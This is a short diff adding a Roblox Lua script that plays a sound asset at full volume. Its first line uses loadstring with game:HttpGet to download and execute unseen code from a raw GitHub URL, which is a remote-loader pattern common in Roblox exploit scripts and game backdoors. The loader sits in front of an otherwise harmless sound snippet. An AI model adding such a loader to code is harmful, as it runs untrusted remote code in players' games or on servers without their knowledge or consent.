@@ -1,0 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
+if true then
+s = Instance.new("Sound",game.Workspace)
+s.Name = "Sound"
+s.SoundId = "http://www.roblox.com/asset?id=4835664238"
+s.Volume = 100
+s.Looped = false
+s.archivable = false
+s:play()
+end
